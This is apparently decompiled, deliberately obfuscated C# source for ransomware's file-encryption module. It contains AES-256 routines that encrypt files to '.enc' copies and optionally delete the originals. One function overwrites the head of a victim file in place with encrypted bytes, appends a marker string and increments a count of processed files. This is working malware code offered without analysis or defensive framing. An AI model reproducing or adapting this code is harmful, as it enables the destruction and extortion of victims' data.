using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace PbjBzLsVOvNrzQ;

public static class PQqYOcUkjAAf
{
	public const int vIseXHHCYslNXl = 256;

	public static byte[] aMMCoEkzZzJfJ(int yvbLALdPhZDvVul)
	{
		byte[] array = new byte[yvbLALdPhZDvVul];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool RbvGKQJPOxEi(string FmyvBJAAAQIJ, byte[] bNtAqiQfwSlXvXZ, bool GLAEPvTsjoG)
	{
		byte[] array = aMMCoEkzZzJfJ(16);
		using FileStream fileStream = new FileStream(FmyvBJAAAQIJ + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = QgKfhjzSDWS(bNtAqiQfwSlXvXZ, array);
		bNtAqiQfwSlXvXZ = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(FmyvBJAAAQIJ, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (GLAEPvTsjoG)
			{
				File.Delete(FmyvBJAAAQIJ);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool zYOSmWrrYN(string VjsTAzKopUrH, byte[] ifRHPaoYPzOpbT, bool ImCtOlIeHb)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(VjsTAzKopUrH, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = QgKfhjzSDWS(ifRHPaoYPzOpbT, array);
		ifRHPaoYPzOpbT = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(VjsTAzKopUrH.Remove(VjsTAzKopUrH.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] zvWzdRNbwlK(byte[] wwiOifKzoVNiyfF, byte[] MQjJbFyFIZGTdlEX, byte[] JXOZmKzBNyXtJ)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = QgKfhjzSDWS(MQjJbFyFIZGTdlEX, JXOZmKzBNyXtJ);
		MQjJbFyFIZGTdlEX = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(wwiOifKzoVNiyfF, 0, wwiOifKzoVNiyfF.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] iPAlvhTLcbxUwF(byte[] pQpmOyDnOX, byte[] OlnsGzaDbdQYKZ, byte[] zLOysqAdLhXyPC)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = QgKfhjzSDWS(OlnsGzaDbdQYKZ, zLOysqAdLhXyPC);
		OlnsGzaDbdQYKZ = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(pQpmOyDnOX, 0, pQpmOyDnOX.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool bZpUeSIPtZUyc(byte[] obYiXpnsqyNxu, byte[] zAOfjHVbyhGo, byte[] hpHYPhKlisn)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = QgKfhjzSDWS(obYiXpnsqyNxu, zAOfjHVbyhGo);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(hpHYPhKlisn);
	}

	public static Rfc2898DeriveBytes QgKfhjzSDWS(byte[] gBIBQeyoVJYiux, byte[] VqejvbPfcMxJoF)
	{
		return new Rfc2898DeriveBytes(gBIBQeyoVJYiux, VqejvbPfcMxJoF, 52768);
	}

	public static byte[] ryXojQCHUSIHVk(string pdCxCdhEAu, int WejcWdVqHywyH)
	{
		byte[] array = new byte[WejcWdVqHywyH];
		try
		{
			if (oIxRFVSIpmRuMqIJ.fujYaOkcjcopB == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(pdCxCdhEAu, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, WejcWdVqHywyH);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(pdCxCdhEAu, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, WejcWdVqHywyH);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (oIxRFVSIpmRuMqIJ.TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(oIxRFVSIpmRuMqIJ.lNABZjYJLaAdehz, "File: " + pdCxCdhEAu + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(pdCxCdhEAu, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, WejcWdVqHywyH);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool fssENAeUQwBsQ(string QNRAGoVmrx, byte[] xYFPAYQKYUJrM, byte[] niyonyMvqJkwBDE = null)
	{
		try
		{
			byte[] array = null;
			if (oIxRFVSIpmRuMqIJ.fujYaOkcjcopB == "YES")
			{
				array = (oIxRFVSIpmRuMqIJ.IMmsNGvAyQxjH ? Encoding.ASCII.GetBytes(oIxRFVSIpmRuMqIJ.PBGxcXGgCq(oIxRFVSIpmRuMqIJ.hqGTpuvOSSOWk) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Kw==") + Convert.ToString(oIxRFVSIpmRuMqIJ.LvVedbSsouja) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Kw==")) : Encoding.ASCII.GetBytes(oIxRFVSIpmRuMqIJ.PBGxcXGgCq(oIxRFVSIpmRuMqIJ.hqGTpuvOSSOWk) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("LQ==") + Convert.ToString(oIxRFVSIpmRuMqIJ.LvVedbSsouja) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(QNRAGoVmrx, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(xYFPAYQKYUJrM, 0, xYFPAYQKYUJrM.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(QNRAGoVmrx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!oIxRFVSIpmRuMqIJ.IMmsNGvAyQxjH)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(niyonyMvqJkwBDE, 0, niyonyMvqJkwBDE.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (oIxRFVSIpmRuMqIJ.IMmsNGvAyQxjH ? Encoding.ASCII.GetBytes(oIxRFVSIpmRuMqIJ.PBGxcXGgCq(oIxRFVSIpmRuMqIJ.hqGTpuvOSSOWk) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Kw==") + Convert.ToString(oIxRFVSIpmRuMqIJ.LvVedbSsouja) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Kw==")) : Encoding.ASCII.GetBytes(oIxRFVSIpmRuMqIJ.PBGxcXGgCq(oIxRFVSIpmRuMqIJ.hqGTpuvOSSOWk) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("LQ==") + Convert.ToString(oIxRFVSIpmRuMqIJ.LvVedbSsouja) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("LQ==")));
				FileStream fileStream2 = new FileStream(QNRAGoVmrx, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(xYFPAYQKYUJrM, 0, xYFPAYQKYUJrM.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(QNRAGoVmrx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!oIxRFVSIpmRuMqIJ.IMmsNGvAyQxjH)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(niyonyMvqJkwBDE, 0, niyonyMvqJkwBDE.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			oIxRFVSIpmRuMqIJ.SSvZxDydUbgEQF++;
		}
		catch (Exception ex)
		{
			if (oIxRFVSIpmRuMqIJ.TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(oIxRFVSIpmRuMqIJ.lNABZjYJLaAdehz, "File: " + QNRAGoVmrx + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (oIxRFVSIpmRuMqIJ.IMmsNGvAyQxjH ? Encoding.ASCII.GetBytes(oIxRFVSIpmRuMqIJ.PBGxcXGgCq(oIxRFVSIpmRuMqIJ.hqGTpuvOSSOWk) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Kw==") + Convert.ToString(oIxRFVSIpmRuMqIJ.LvVedbSsouja) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("Kw==")) : Encoding.ASCII.GetBytes(oIxRFVSIpmRuMqIJ.PBGxcXGgCq(oIxRFVSIpmRuMqIJ.hqGTpuvOSSOWk) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("LQ==") + Convert.ToString(oIxRFVSIpmRuMqIJ.LvVedbSsouja) + oIxRFVSIpmRuMqIJ.PBGxcXGgCq("LQ==")));
				FileStream fileStream4 = new FileStream(QNRAGoVmrx, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(xYFPAYQKYUJrM, 0, xYFPAYQKYUJrM.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(QNRAGoVmrx, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!oIxRFVSIpmRuMqIJ.IMmsNGvAyQxjH)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(niyonyMvqJkwBDE, 0, niyonyMvqJkwBDE.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
